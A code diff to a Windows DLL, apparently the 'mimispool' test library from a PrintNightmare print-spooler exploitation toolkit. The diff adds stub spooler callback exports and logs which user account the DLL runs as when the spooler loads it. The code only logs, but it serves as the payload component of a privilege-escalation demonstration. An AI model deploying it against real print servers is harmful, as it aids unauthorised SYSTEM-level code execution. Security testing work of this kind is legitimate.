@@ -14,7 +14,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         case DLL_PROCESS_ATTACH:
 			kspool(TEXT(__FUNCTION__) L"-PROCESS_ATTACH");
 			ret = FALSE; 
-			// FALSE avoid to keep library in memory
+			// FALSE avoid to keep library in memory (PrintNightmare < 3/4)
 			// TRUE will mimic "real" driver/config -- to use/test with /useown on local (remote is not compatible with GetFileVersionInfo*)
             break;
 
@@ -100,11 +100,7 @@ void kspool(LPCWSTR szFrom)
 	if(kspool_logfile = _wfopen(L"mimispool.log", L"a"))
 #pragma warning(pop)
 	{
-		if(GetUserName(Buffer, &cbBuffer))
-		{
-			klog(kspool_logfile, L"[" PLATFORM L"] [%s] I\'m running with \'%s\' (and I like it :)\n", szFrom, Buffer);
-		}
-
+		klog(kspool_logfile, L"[" PLATFORM L"] [%s] as \'%s\'\n", szFrom, GetUserName(Buffer, &cbBuffer) ? Buffer : L"-");
 		fclose(kspool_logfile);
 	}
 }
@@ -119,4 +115,16 @@ void klog(FILE * logfile, PCWCHAR format, ...)
 		va_end(args);
 		fflush(logfile);
 	}
+}
+
+DWORD WINAPI GenerateCopyFilePaths(LPCWSTR pszPrinterName, LPCWSTR pszDirectory, LPBYTE  pSplClientInfo, DWORD   dwLevel, LPWSTR  pszSourceDir, LPDWORD pcchSourceDirSize, LPWSTR  pszTargetDir, LPDWORD pcchTargetDirSize, DWORD dwFlags)
+{
+	kspool(TEXT(__FUNCTION__));
+	return ERROR_SUCCESS;
+}
+
+BOOL WINAPI SpoolerCopyFileEvent(LPWSTR pszPrinterName, LPWSTR pszKey, DWORD  dwCopyFileEvent)
+{
+	kspool(TEXT(__FUNCTION__));
+	return TRUE;
 }
